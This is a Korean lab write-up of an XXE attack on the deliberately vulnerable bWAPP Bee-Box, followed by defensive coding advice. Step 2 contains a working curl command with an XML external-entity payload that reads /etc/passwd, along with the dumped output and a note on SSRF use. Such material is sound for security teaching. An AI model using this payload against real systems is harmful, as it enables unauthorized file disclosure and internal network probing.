# 웹 해킹 실습 교육: XML External Entity Attacks (XXE)

> **교육 목적 전용 (For Educational Purposes Only)**  
> 본 문서는 bWAPP(Bee-Box) 취약점 실습 환경을 대상으로 작성되었습니다.  
> 허가 없이 타인의 시스템에 적용하는 것은 불법입니다.

---

## 📋 실습 환경 정보

| 항목 | 내용 |
|------|------|
| **대상 서버** | `192.168.0.20` (bWAPP Bee-Box) |
| **공격자 서버** | `192.168.0.146` (Kali Linux) |
| **실습/대상 URL** | `http://192.168.0.20/bWAPP/xxe-1.php` (입력 폼) <br> `http://192.168.0.20/bWAPP/xxe-2.php` (처리 로직) |
| **계정 정보** | `bee / bug` |
| **보안 레벨** | Low (Security Level: 0) |
| **실습 일시** | 2026-04-21 |

---

## 🎯 취약점 개요

### XXE (XML External Entity) 취약점이란?

애플리케이션이 외부 개체(External Entity) 참조가 포함된 악의적인 XML 입력을 파싱(Parsing)할 때 발생하는 취약점입니다. 공격자는 XML 문서 상단에 시스템 내부 파일(`/etc/passwd` 등)이나 내부망 URL을 가리키는 외부 엔티티(Entity)를 선언하고, 이를 본문 태그의 값으로 참조하도록 넘깁니다.

서버의 XML 파서(Parser)가 보안을 고려하지 않은 채 이 엔티티를 해석하면, 지정한 로컬 파일 내용이 그대로 읽혀서 XML 결과의 일부로 통합되고 브라우저로 응답됩니다.

### 대표적인 악용 사례 파급력
- 내부 민감 로컬 파일 정보 열람 (Local File Disclosure)
- 내부망 포트 스캐닝 기반 SSRF (Server-Side Request Forgery)
- 드물게 DOS(Billion Laughs Attack)

### OWASP Top 10 분류
- **A05:2021** – Security Misconfiguration (이전까지는 독자적인 A4 XXE로 할당됨)

---

## 🔍 공격 흐름 다이어그램

```
[공격자 (Kali Linux)]
        │
        ▼
[1단계] 취약 페이로드(xxe-1.php) 구조 모니터링
        (AJAX를 통해 xxe-2.php 로 XML 포맷 데이터를 POST 전송하는 흐름 확인)
        │
        ▼
[2단계] 악성 Entity가 포함된 Data 페이로드 생성
        (<!ENTITY xxe SYSTEM "file:///etc/passwd"> 선언 후 <login>&xxe;</login> 호출)
        │
        ▼
[3단계] xxe-2.php 인터페이스로 페이로드 강제 전송
        (XML 파서가 해당 파일을 백그라운드 텍스트로 읽어들여 login 텍스트 영역에 치환)
        │
        ▼
[4단계] 시스템 로컬 파일 (System Information) 완전 탈취
        (응답 결과에 병합된 암호/계정 정보 확인)
```

---

## 🛠️ 단계별 실습 (실제 실행 명령어)

### Step 1: 취약점 데이터 흐름(AJAX) 분석

bWAPP 환경의 `xxe-1.php`의 'Any bugs?' 버튼을 클릭할 경우 브라우저는 화면 전환 없이 백도어로 `xxe-2.php` 에 XML 데이터를 쏩니다.
```xml
<!-- 정상적인 전송 예시 -->
<reset><login>bee</login><secret>Any bugs?</secret></reset>
```

---

### Step 2: XXE Payload (시스템 파일 인클루전) 작성 및 전송 

이 `POST` 요청을 가로채서(또는 직접 구성하여) 앞부분에 파일 시스템 객체를 연결하는 DTD 지시어(`<!DOCTYPE ...>`)를 삽입합니다.

```bash
# 1. 파일시스템 /etc/passwd 내용을 읽는 공격용 XML을 cURL을 통해 xxe-2.php에 전송
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     -X POST \
     -H "Content-Type: text/xml" \
     -d '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><reset><login>&xxe;</login><secret>Any bugs?</secret></reset>' \
     "http://192.168.0.20/bWAPP/xxe-2.php"
```

**실행 결과 및 반응:**
```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
... (전체 내용 생략) ...
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
bee:x:1000:1000:bee,,,:/home/bee:/bin/bash
...
's secret has been reset!
```
> 💡 서버 백엔드의 리턴 코드인 `$message = $login . "'s secret has been reset!";` 에서 `$login` 변수 공간에 거대한 `/etc/passwd` 파일의 내용 전체가 성공적으로 병합되어 브라우저로 쏟아져 나온 장면입니다.

---

## 📊 탈취(추출) 정보 요약

| 정보 유형 | 탈취된 데이터 내용 |
|-----------|------------------|
| **운영체제 시스템 정보** | 시스템 모든 계정 테이블(`/etc/passwd`) 전문 (전체 덤프) |
| **추가 영향** | `file:///` 외에도 `http://localhost:8080/` 과 같이 지정 시 SSRF 용도(내부 웹 포트 조사)로까지 확장 가능 |

---

## 🛡️ 취약점 발생 원인 및 방어 기법

### 취약점 메커니즘
해당 페이지에서는 `$_COOKIE["security_level"] == "0"` 일 때, 파싱 구문인 `simplexml_load_string($body)`를 아무런 보안 조치 없이 사용했습니다. PHP의 구버전 파서는 외부 엔티티(Entity) 접근을 활성화해 두는 것이 기본 스펙이었기 때문에 이 심각한 취약점이 표면으로 올라왔습니다.

### 방어(Secure Coding) 가이드

1. **외부 엔티티(Entity / DTD) 로딩 원천 차단 ⭐️**
   가장 핵심적인 근본 방어 대책입니다. XML 문서를 파싱하기 전 단계에서 외부 자원을 끌어오는 기능 자체를 비활성화해야 합니다. PHP 8 이상 구조에서는 취약한 로딩이 기본적으로 막혀 있으나, 이전 버전 등에서는 명시적인 해제 코드가 필요합니다.
   
   ```php
   // bWAPP Security Level 2 (High)의 실제 방어 구조:
   // 파서의 외부 엔티티 로딩 능력을 강제 비활성화
   libxml_disable_entity_loader(true);
   
   $xml = simplexml_load_string($body);
   ```
2. **JSON 포맷으로의 대체**
   현대의 웹 API 아키텍처에서는 무겁고 낡은 XML 포맷보다 엔티티 개념이 없어 아키텍처적으로 이 문제로부터 원천 자유로운 JSON을 사용하는 것이 더욱 권장됩니다.

---

## ⚖️ 법적 고지

> 이 문서의 모든 기법은 **bWAPP(Bee-Box)** 의도적 취약 환경에서  
> **교육 목적**으로만 수행되었습니다.  
> 허가받지 않은 환경에 해당 기술을 활용할 경우 **심각한 법적 불이익**을 받을 수 있습니다.
> 반드시 본인 소유 또는 적법한 동의를 얻은 환경 내에서 활용하십시오.

---

*작성일: 2026-04-21 | 실습 환경: Kali Linux + bWAPP Bee-Box | 작성: ngnicky-ai*
